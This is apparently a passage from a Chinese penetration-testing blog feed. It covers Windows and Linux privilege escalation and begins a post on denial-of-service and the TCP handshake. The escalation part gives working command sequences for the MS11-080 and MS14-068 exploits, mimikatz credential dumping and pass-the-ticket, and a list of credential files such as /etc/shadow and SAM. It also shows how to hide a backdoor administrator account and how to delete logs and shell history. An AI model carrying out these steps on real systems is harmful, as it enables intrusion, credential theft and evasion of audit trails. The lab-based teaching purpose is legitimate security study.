href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p><p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><pre><code> root@kali:~# searchsploit Ms11-080     ------------------------------------------ --------------------------------      Exploit Title                            |  Path                                               | (/usr/share/exploitdb/)     ------------------------------------------ --------------------------------     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py     ------------------------------------------ -------------------------------- root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py . # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用) # 首先查看 WinXP 是否安装了 对应更新 Kb2592799 WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 查看 WinXP下的文件路径</p><p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p><pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  启动任务管理器</p><p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  结束 kevin 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  输入 explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p><p>  启动 system 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.WinXP 无需安装 Pyhon 的运行环境</p><pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包  root@kali:~# apt-get install python-pip  root@kali:~# pip install pyinstaller  # 或者 WinXP 下，安装 python2.7  C:\&gt;pyinstaller --onefile 18176.py      297 INFO: Building EXE from out00-EXE.toc      297 INFO: Appending archive to EXE C:\dist\18176.exe      328 INFO: Building EXE from out00-EXE.toc completed successfully.</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>  # 打开文件目录，将文件复制到目标主机  C:\&gt;whoami      test  C:\&gt;net user test      本地组成员             *Users      全局组成员             *None  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\&gt;cd 111     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     C:\WINDOWS\system32&gt;whoami         SYSTEM     # 将自己添加为管理员组     C:\WINDOWS\system32&gt;net localgroup administrators test /add         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p><h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul><li><p>使用 win2003 搭建域控制器</p><ul><li><p>配置并连接域控制器</p><ul><li>运行 -&gt; dcpromo</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p></li></ul></li></ul><pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址     # Win2003 设置强密码     C:\&gt;net user Administrator jlcssadmin2006...     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p><p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p><p>重启之后</p><p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>修改 Win2003 中的域控制器的用户权限</p><ul><li>Win2003 -&gt; 运行 -&gt; dsa.msc</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>win2003</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7 可以查看域控制器共享出来的文件等资源</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p><ul><li><p>使用漏洞代码攻击域控制器</p><ul><li><p>获取攻击文件</p><pre><code>  # root@kali:~# searchsploit Ms14-068      ------------------------------------------ ----------------------------------       Exploit Title                            |  Path                                | (/usr/share/                    exploitdb/)      ------------------------------------------ ----------------------------------      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py      ------------------------------------------ ---------------------------------  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li><li><p>域环境下使用通用工具查看本地密码</p></li></ul><pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码  C:\&gt;wce-universal.exe    # 结果是域控制器密码  C:\&gt;wce-universal.exe -w      Administrator\LAB:jlcssadmin  C:\Win32&gt;mimikatz.exe  mimikatz # ::  mimikatz # privilege::debug      Privilege &#39;20&#39; OK  mimikatz # kerberos::list  mimikatz # sekurlsa::logonPasswords</code></pre><ul><li>漏洞利用过程</li></ul><pre><code>  1. 首先在 kali 通过脚本生成一个票据文件      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com      -u 用户名:登录用户名      -s userSID      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替  2. 将票据文件拷贝到 win 系统里      # 拷贝 TGT_user1@lab.com.ccache 到windows系统  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit  # 在 Win7 上使用本地用户登录  # 查看域账号的信息  C:\&gt;net user      \\WIN7-VM 的用户帐户      Administrator            Guest                    John      user1                    user2      命令成功完成。  C:\Win32&gt;whoami.exe /all      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111  # kali 报错缺少模块  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132  # 下载安装模块https://github.com/bidord/pykek</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p></li></ul><pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132     Password:        [+] Building AS-REQ for 172.16.10.132... Done!       [+] Sending AS-REQ to 172.16.10.132... Done!       [+] Receiving AS-REP from 172.16.10.132... Done!       [+] Parsing AS-REP from 172.16.10.132... Done!       [+] Building TGS-REQ for 172.16.10.132... Done!       [+] Sending TGS-REQ to 172.16.10.132... Done!       [+] Receiving TGS-REP from 172.16.10.132... Done!       [+] Parsing TGS-REP from 172.16.10.132... Done!       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done             # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code>     # 在 Win7 下执行     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket     C:\mimikatz\Win32&gt;klist         当前登录 ID 是 0:0x776bd         缓存的票证: (1)         #0&gt;     客户端: user3 @ LAB.COM             服务器: krbtgt/LAB.COM @ LAB.COM             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent             开始时间: 3/4/2018 2:00:45 (本地)             结束时间:   3/4/2018 12:00:44 (本地)             续订时间: 3/11/2018 2:00:44 (本地)             会话密钥类型: RSADSI RC4-HMAC(NT)     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$         命令成功完成。</code></pre><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul><li>与漏洞提权相比更常用的方法 <ul><li>企业环境 </li><li>补丁更新的全部已经安装 </li><li>输入变量过滤之外更值得研发关注的安全隐患 </li><li>以system权限启动 </li><li>NTFS权限允许users修改删除 </li></ul></li><li>icacls<ul><li>icacls c:\windows*.exe /save perm /T </li><li>i586-mingw32msvc-gcc -o admin.exe admin.c </li></ul></li><li>Find<ul><li>find / -perm 777 -exec ls -l {} ; </li></ul></li><li>应用系统的配置文件 <ul><li>应用连接数据库的配置文件 </li></ul></li></ul><h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212609.png" alt=""></p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212636.png" alt=""></p><ul><li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li></ul><pre><code> C:\&gt;icacls boot.ini     boot.ini BUILTIN\Power Users:(RX)              BUILTIN\Administrators:(F)              NT AUTHORITY\SYSTEM:(F)     Successfully processed 1 files; Failed processing 0 files # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统 # 查询各程序的权限情况 C:\&gt;icacls c:\windows\*.exe /save saveicacls /T</code></pre><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p><pre><code> BU：build user PU：power user BA：build administrator 如果 BU 是 F 的话，则说明可以替换 如果出现 FA；；；BU，则说明权限配置不当 # kali 下使用 c 文件生成 winXP 下的可执行程序 root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -lfind / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件2. 后台服务运行账号</code></pre><h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux•/etc/resolv.conf•/etc/passwd•/etc/shadow•whoami and who –a•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r•uname –a, ps aux•dpkg -l| head# Windows•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r•net view , net view /domain    # 查共享信息•net user /domain, net user %username% /domain  # 查域信息•net accounts, net share•net localgroup administrators username /add•net group &quot;Domain Controllers&quot; /domain•net share name$=C:\ /unlimited    # 把 C盘共享出来•net user username /active:yes /domain  # 域管理员重新启动被锁定账号</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmicwmic:root\cli&gt;/?[global switches] &lt;command&gt;有效的全局开关有:/NAMESPACE           别名使用的名称空间路径。/ROLE                包含此别名定义的角色路径。/NODE                别名使用的服务器。/IMPLEVEL            客户模拟级别。/AUTHLEVEL           客户身份验证级别。/LOCALE              客户应用的语言识别符。/PRIVILEGES          启用或禁用所有特权。/TRACE               将调试信息输出到 stderr。/RECORD              将所有输入命令和输出写入日志。/INTERACTIVE         设置或重设交互模式。/FAILFAST            设置或重置 FailFast 模式。/USER                会话期间使用的用户。/PASSWORD            用于会话登录的密码。/OUTPUT              为输出重新定向指定模式。/APPEND              为输出重新定向指定模式。/AGGREGATE           设置或重置集合模式。/AUTHORITY           Specifies the &lt;authority type&gt; for the connection./?[:&lt;BRIEF|FULL&gt;]    用法信息。•wmic nicconfig get ipaddress,macaddress•wmic computersystem get username•wmic netlogin get name,lastlogon•wmic process get caption, executablepath,commandline   # 提取软件安装信息•wmic process where name=“calc.exe&quot; call terminate  # 结束进程•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本•wmic product get name,version                  # 提取软件信息•wmic product where name=“name” call uninstall /nointeractive   # 静默删除•wmic share get /ALL                            # 提取共享文件夹•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面•wmic nteventlog get path,filename, writeable   #查看日志目录C:\&gt;wmic nteventlog get path,filename, writeableFileName   Path                       Writeableappevent   \windows\system32\config\  TRUEntds       \windows\system32\config\  TRUEdnsevent   \windows\system32\config\  TRUEntfrs      \windows\system32\config\  TRUEsecevent   \windows\system32\config\  TRUEsysevent   \windows\system32\config\  TRUEThinPrint  \windows\system32\config\  TRUE</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux•/etc ；/usr/local/etc•/etc/passwd ；/etc/shadow•.ssh ；.gnupg 公私钥•The e-mail and data files•业务数据库 ；身份认证服务器数据库•/tmp# windows•SAM 数据库 ； 注册表文件•%SYSTEMROOT%\repair\SAM•%SYSTEMROOT%\System32\config\RegBack\SAM•业务数据库； 身份认证数据库•临时文件目录•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</code></pre><h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul><li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li><li>windows 系统</li></ul><pre><code>•禁止在登陆界面显示新建账号•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0•del %WINDIR%\*.log /a/s/q/f•History•日志•auth.log / secure•btmp / wtmp•lastlog / faillog•其他日志和 HIDS 等# 控制系统之后，新建账号并添加管理员组C:\&gt;net user user4 123456 /add命令成功完成。C:\&gt;net localgroup administrators user4 /add命令成功完成。# 这样开机登录的界面会显示这个账户# 可以通过添加注册表来隐藏REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0操作成功结束# 但是使用 net user 还是可以查看到这个账户# 强制静默删除日志C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul><li>Linux 系统</li></ul><pre><code>root@kali:~# history# history 记录保存在 .bash_historyroot@kali:~# ls -l .bash_history     -rw------- 1 root root 15418 3月   4 00:28 .bash_history# 擦除痕迹root@kali:~# history -croot@kali:~# lsattr    --------------e---- ./Downloads    --------------e---- ./Desktop    --------------e---- ./testDir    --------------e---- ./Pictures    --------------e---- ./Public    --------------e---- ./vmware-tools-patches    --------------e---- ./Videos    --------------e---- ./Documents    --------------e---- ./Music    --------------e---- ./Templatesroot@kali:~# chattr -h    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...# 修改文件属性让其无法被写入数据root@kali:~# touch 456.txtroot@kali:~# lsattr 456.txt     --------------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt root@kali:~# chattr +i 456.txt root@kali:~# lsattr 456.txt     ----i---------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt     -bash: 456.txt: 不允许的操作# 修改 .bash_history，让其无法被写入，会变成只读文件root@kali:~# chattr +i .bash_history# 日志记录•auth.log / secure•btmp / wtmp•lastlog / faillogroot@kali:~# cat /var/log/auth.logroot@kali:~# cat /var/log/wtmproot@kali:~# lastlog    用户名           端口     来自             最后登陆时间    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018    daemon                                     **从未登录过**    bin                                        **从未登录过**    sys                                        **从未登录过**    sync                                       **从未登录过**    games                                      **从未登录过**    man                                        **从未登录过**    lp                                         **从未登录过**    mail                                       **从未登录过**    news                                       **从未登录过**    uucp                                       **从未登录过**    proxy                                      **从未登录过**    www-data                                   **从未登录过**    backup                                     **从未登录过**    list                                       **从未登录过**    irc                                        **从未登录过**    gnats                                      **从未登录过**    nobody                                     **从未登录过**</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（一）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（一）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（一）&lt;/h2&gt;&lt;h3 id=&quot;windows提权
      
    
    </summary>
    
    
      <category term="渗透测试学习中常见提权方式总结（一）" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试——拒绝服务</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</id>
    <published>2020-04-03T11:58:09.000Z</published>
    <updated>2020-04-28T06:05:52.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拒绝服务常见的攻击方式总结"><a href="#拒绝服务常见的攻击方式总结" class="headerlink" title="拒绝服务常见的攻击方式总结"></a>拒绝服务常见的攻击方式总结</h2><h4 id="1-拒绝服务简介"><a href="#1-拒绝服务简介" class="headerlink" title="1.拒绝服务简介"></a>1.拒绝服务简介</h4><ul><li>Dos不是Ddos<ul><li>利用程序漏洞或一对一资源耗尽的Denial of service拒绝服务</li></ul></li><li>DDos分布式拒绝服务<ul><li>一对一的攻击完全拼各自的资源，效果差。</li><li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li></ul></li><li>历史<ul><li>以前：欠缺技术能力的无赖，我ping死你</li><li>现在：最强大最危险的攻击，攻击方式众多<ul><li>贩卖和租用肉鸡已经成为黑产种重要的一部分</li><li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费。</li></ul></li></ul></li></ul><h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2.DoS分类"></a>2.DoS分类</h4><ul><li>D网络<ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood、UDP Flood</li></ul></li><li>D协议<ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL </li></ul></li><li>D应用<ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用（CC）</li><li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li><li>可以是一击毙命的，也可以是耗尽目标资源的</li></ul></li></ul><h4 id="3-为何会被Dos"><a href="#3-为何会被Dos" class="headerlink" title="3.为何会被Dos"></a>3.为何会被Dos</h4><ul><li>从攻击者到被害者<ul><li>网络—&gt;FW（服务）—&gt;服务器OS—&gt;服务应用</li></ul></li><li>资源耗尽<ul><li>网络：带宽</li><li>FW:吞吐量、并发连接</li><li>服务器：CPU、内存、I/O</li><li>应用：处理请求能力，对OS资源的使用权</li></ul></li><li>程序漏洞攻击<ul><li>缓冲区溢出</li><li>协议、程序逻辑漏洞</li></ul></li><li>链路上任何一点都可成为目标</li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200320111906.png" alt=""></p><h3 id="拒绝服务——Syn-Flood攻击"><a href="#拒绝服务——Syn-Flood攻击" class="headerlink" title="拒绝服务——Syn-Flood攻击"></a>拒绝服务——Syn-Flood攻击</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>1.TCP连接和端口过程</p><p><strong>TCP建立连接</strong></p><p>第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p><p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p><p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p><p>未连接队列<br>在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。<br><strong>关闭TCP连接</strong></p><p>对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：</p><p>第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。</p><p>第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。</p><p>第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。</p><p>第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。</p><p>2.TCP 连接状态</p><p><img src="SW5S4jW.png" alt="img"></p><p>3.两个序号和三个标志位：</p><ul><li>序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</li><li>确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。</li><li>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：<ul><li>URG：紧急指针（urgent pointer）有效。</li><li>ACK：确认序号有效。</li><li>PSH：接收方应该尽快将这个报文交给应用层。</li><li>RST：重置连接。</li><li>SYN：发起一个新连接。</li><li>FIN：释放一个连接。</li></ul></li><li>需要注意的是：<ul><li>不要将确认序号ack与标志位中的ACK搞混了。</li><li>认方ack=发起方req+1，两端配对</li></ul></li></ul><p><img src="qoYhkJa.png" alt="img"><br>在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，</p><p>因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；</p><p>第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。</p><p><strong>4.四次挥手</strong></p><ul><li>由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，</li><li>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN</li><li>首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。<ul><li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态</li><li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li><li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li><li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li></ul></li></ul><h4 id="1-scapy构造数据包"><a href="#1-scapy构造数据包" 